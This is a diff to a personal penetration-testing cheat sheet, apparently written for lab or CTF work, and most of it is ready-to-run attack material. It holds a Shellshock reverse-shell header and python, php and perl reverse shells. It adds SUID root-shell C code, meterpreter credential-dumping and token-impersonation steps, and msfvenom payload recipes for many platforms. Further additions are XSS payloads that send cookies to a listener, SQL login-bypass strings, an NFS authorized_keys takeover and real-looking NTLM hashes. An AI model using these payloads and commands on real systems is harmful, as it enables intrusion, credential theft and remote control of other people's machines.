@@ -4,6 +4,9 @@ find / -uid 0 -perm -4000 2>/dev/null
 # find things that are world writable
 find / -perm -o=w
 
+# find SUID binaries
+find / -perm -u=s -type f 2>dev/null
+
 # find names with dots and spaces, there shouldn’t be any
 find / -name " " -print
 find / -name ".." -print
@@ -24,9 +27,6 @@ lsof +L1
 
 # get information about procceses with open ports
 lsof -i
-
-# look for weird things in arp
-arp -a
 
 # look at all accounts including AD
 getent passwd
@@ -97,7 +97,7 @@ find /var/log -type f -exec ls -la {} \; 2>/dev/null
 find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la
 
 
-# python pty
+# pty shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 
 
@@ -109,7 +109,7 @@ ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.p
 php -S 0.0.0.0:8888
 
 
-# shell-shock bash reverse shell 
+# shell-shock bash reverse 
 
 curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<target>/cgi-bin/admin.cgi -v
 
@@ -134,7 +134,7 @@ curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http:
 
 wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
 
-# same as above except using the python reverse 
+# same as above except using the python reverse method
 
 wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.57.102\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
 
@@ -242,7 +242,6 @@ mount 192.168.1.1:/vol/share /mnt/nfs
 # mount a windows share
 smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 
-
 # connect to a samba share 
 $ smbmount //server/share /mnt/win -o user=username,password=password1
 $ smbclient -U user \\\\server\\share
@@ -257,15 +256,15 @@ pth-winexe -U hash //IP cmd
 or
 
 apt-get install freerdp-x11
-xfreerdp /u:USER /d:win2012 /pth:HASH /v:IP
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
 
 or
 
 meterpreter > run post/windows/gather/hashdump
-Administrator:500:***:::
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
 msf > use exploit/windows/smb/psexec
 msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
-msf exploit(psexec) > set SMBPass HASH
+msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 msf exploit(psexec) > exploit
 meterpreter > shell
 
@@ -274,13 +273,11 @@ meterpreter > shell
 
 
 # python reverse shell
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.236.142",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
 # php reverse shell
 php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
-
 
 
 # perl reverse shell
@@ -322,7 +319,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 
 
-# Cewl a website then mangle 
+# Cewl a website then mangle it
 $ cewl -m 4 -w dict.txt http://site.url
 $ john --wordlist=dict.txt --rules --stdout
 
@@ -363,15 +360,28 @@ kali > rdesktop 127.0.0.1:3389
 
 
 
-# SUID C Shell for /bin/bash or /bin/whatever you want
+
+# quick C shell
+
 int main(void){
        setresuid(0, 0, 0);
        system("/bin/bash");
 }       
 
+# another
+
+int main(void) 
+ { 
+ setgid(0); 
+ setuid(0); 
+ execl("/bin/sh", "sh", 0);
+ }
 
 
-# SQLMap examples
+
+
+
+# SQLMap examples, check highoncoffee blog for more like this
 
 # automated scan
 
@@ -440,7 +450,7 @@ http://www.heise.de/download/pwdump.html
 
 
 
-#usefull msf modules of all kinds (just keep these in mind)
+#usefull msf modules of all kinds (just keep these in mind) and post exploit stuff 
 #bypass UAC on win7x86/64
 use exploit/windows/local/bypassuac
 
@@ -475,45 +485,119 @@ run post/windows/gather/local_admin_search_enum
 
 
 
+[+] Meterpreter Shell Get Loots
+
+meterpreter > sysinfo
+
+meterpreter > getuid
+
+meterpreter > getsystem
+
+meterpreter > hashdump
+
+meterpreter > load/use mimikatz
+
+kerberos          Attempt to retrieve kerberos creds
+livessp           Attempt to retrieve livessp creds
+mimikatz_command  Run a custom commannd
+msv               Attempt to retrieve msv creds (hashes)
+ssp               Attempt to retrieve ssp creds
+tspkg             Attempt to retrieve tspkg creds
+wdigest           Attempt to retrieve wdigest creds
+
+meterpreter > wdigest
+
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token SERV-2K3\\Administrator
+execute -f cmd.exe -i -t
 
 
 
-# XSS stuff
 
-https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+[+] Creating Metasploit Payloads
 
-("< iframes > src=http://IP:PORT </ iframes >")
+[+] Size of Payloads
+  --smallest
+  -s 700
+  
 
-<script>document.location=http://IP:PORT</script>
+List payloads
+msfvenom -l
 
-';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+Binaries
 
-";!–"<XSS>=&amp;amp;{()}
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
-<IMG SRC="javascript:alert('XSS');">
-<IMG SRC=javascript:alert('XSS')>
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
-<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
-<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
-<IMG SRC="jav ascript:alert('XSS');">
-
-perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
-
-<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-
-(">< iframes http://google.com < iframes >)
-
-<BODY BACKGROUND="javascript:alert('XSS')">
-<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
-"><script >alert(document.cookie)</script>
-%253cscript%253ealert(document.cookie)%253c/script%253e
-"><s"%2b"cript>alert(document.cookie)</script>
-%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
-<img src=asdf onerror=alert(document.cookie)>
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
 
 
-# auth bypass 
+Web Payloads
+
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
+
+Scripting Payloads
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+
+Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+
+
+Shellcode
+
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+
+Linux Based Shellcode
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+
+Windows Based Shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+
+Mac Based Shellcode
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+
+
+Handlers
+
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
+Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
+
+
+
+
+
+
+#auth bypass 
 
 or 1=1
 or 1=1--
@@ -567,8 +651,214 @@ admin") or "1"="1"/*
 
 
 
+[+] Cookie Stealing:
+
+[-] Start Web Service
+
+python -m SimpleHTTPServer 80
+
+[-] Use one of the following XSS payloads:
+
+<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
+<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
+
+
+
+# XSS stuff
+
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+("< iframes > src=http://IP:PORT </ iframes >")
+
+<script>document.location=http://IP:PORT</script>
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+";!–"<XSS>=&amp;amp;{()}
+
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
+<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
+
+<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
+<IMG SRC="jav ascript:alert('XSS');">
+
+perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
+
+<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+(">< iframes http://google.com < iframes >)
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
+"><script >alert(document.cookie)</script>
+%253cscript%253ealert(document.cookie)%253c/script%253e
+"><s"%2b"cript>alert(document.cookie)</script>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
+<img src=asdf onerror=alert(document.cookie)>
+"""
 
 
 
 
+-------------------------------------------------------------------------- Unix RPC
+
+[+] NFS Mounts
+
+Metasploit : auxiliary/scanner/nfs/nfsmount
+
+rpcinfo -p 192.168.0.10
+
+showmount -e 192.168.0.10
+mount 192.168.0.10:/secret /mnt/share/
+
+ssh-keygen
+mkdir /tmp/r00t
+mount -t nfs 192.168.0.10:/secret /mnt/share/
+cat ~/.ssh/id_rsa.pub >> /mnt/share/root/.ssh/authorized_keys
+umount /mnt/share
+ssh root@192.168.0.10
+
+
+-------------------------------------------------------------------------- Windows Networking Services
+
+[+] Get Domain Information:
+nltest /DCLIST:DomainName
+nltest /DCNAME:DomainName
+nltest /DSGETDC:DomainName
+
+[+] Netbios Enumeration
+nbtscan -r 192.168.0.1-100
+nbtscan -f hostfiles.txt
+
+[+] enum4linux
+
+[+] RID Cycling
+use auxiliary/scanner/smb/smb_lookupsid
+
+[+] Null Session in Windows
+net use \\192.168.0.1\IPC$ "" /u:""
+
+[+] Null Session in Linux
+smbclient -L //192.168.99.131
+
+
+
+
+
+
+-------------------------------------------------------------------------- File Transfer Services
+
+[+] Start TFTPD Server
+atftpd --daemon --port 69 /tmp
+
+[+] Connect to TFTP Server
+tftp 192.168.0.10
+put / get files
+
+
+
+CTF Notes
+---------
+
+# Enumerate Users via Finger
+finger user@192.168.0.20
+
+# Show nfs shares available
+showmount -e 192.168.1.54
+
+# User nfspysh to mount share and create .ssh directory
+nfspysh -o server=192.168.0.20:/home/user
+mkdir .ssh
+cd .ssh
+
+# Generate ssh key pair
+ssh-keygen
+cp id_rsa.pub /tmp/authorized_keys
+
+# Transfer attacker public key to host
+put /tmp/authorized_keys
+exit
+
+# Login to SSH server with no password
+SSH_AUTH_SOCK=0 ssh user@192.168.0.20
+
+
+
+
+
+
+
+
+[>] HTTP Basic Authentication Dictionary and Brute-force attacks with Burp Suite
+
+http://www.dailysecurity.net/2013/03/22/http-basic-authentication-dictionary-and-brute-force-attacks-with-burp-suite/
+
+Burp Suite against HTTP Basic authentication
+
+To implement the attack you need to capture one authentication request with Burp Proxy and send it to Burp Intruder.
+
+Mark only the Base64 encoded string and click Add button to put the markers around it.
+
+Dictionary attack
+
+For the dictionary attack I’m using custom iterator intruder option. It allows you to generate your own custom payload string consisting from several substrings. For every substring you could specify separator which is basically e suffix. The Intruder calls those substrings “positions”.
+Following this logic in position 1 we would like to load an username followed by separator semicolumn and then load password for position 2.
+Go to Payload tab and select Custom iterator option from Payload type dropdown box.
+Burp Suite Custom Iterator
+Select position 1 from the Position dropdown box and load your usernames list in List items for position 1 listbox. Put semicolumn in the Separator for position 1 text box.
+Position 1 list and separator option
+Select position 2 from the Position dropdown box and load your passwords list in List items for position 2 listbox.
+Position 2
+After you’ve set your two positions you need to tell the Intruder to encode the payload string using Base64 encoding. Go to Payload processing sections and click Add button. Select Payload encoding option and then Base64.
+PayloadProcessin_AddRule_Encode
+PayloadProcessingEncode
+By default Burp Intruder URL encodes the payload. Base64 strings often contain = symbol. That is why it is a good idea to exclude it from the list of URL characters for encoding.
+That’s it. You can start the Intruder attack.
+
+Bruteforce attack
+
+The method I’m using for the bruteforce attack is targeting only one username per Intruder attack.
+Select Brute forcer from the Payload type dropdown and then set the length of the password and the characterset you would like the Intruder to use while constructing the password strings.
+Burp Intruder Brute forcer
+In order to specify the username you would like to brute-force you need to set Payload processing rule. Add new rule with Add prefix type and fill up the username followed by semi-column.
+Burp Intruder Add Prefix
+Add another rule to encode the payload using Base64. And finally remove = from the list of symbols subject of URL encoding.
+Burp Sutei Bruteforce Attack Settings
+Done! You can start the Intruder attack!
+
+[>] Automated Security Analyser for ASP.NET Websites 
+
+https://asafaweb.com
+
+
+
+
+
+
+
+
+[+] Secure Copy (scp) Cheatsheet
+--------------------------------
+
+[>] Copy remote file to local host:
+
+$ scp your_username@192.168.0.10:<remote_file> /some/local/directory
+
+[>] Copy local file to remote host:
+
+$ scp <local_file> your_username@192.168.0.10:/some/remote/directory
+
+[>] Copy local directory to remote directory:
+
+scp -r <local_dir> your_username@192.168.0.10:/some/remote/directory/<remote_dir>
+
+[>] Copy a file from one remote host to another:
+
+scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2>:/some/remote/directory/
+
+[>] Improve scp performance (use blowfish):
+
+scp -c blowfish <local_file> your_username@192.168.0.10:/some/remote/directory
 
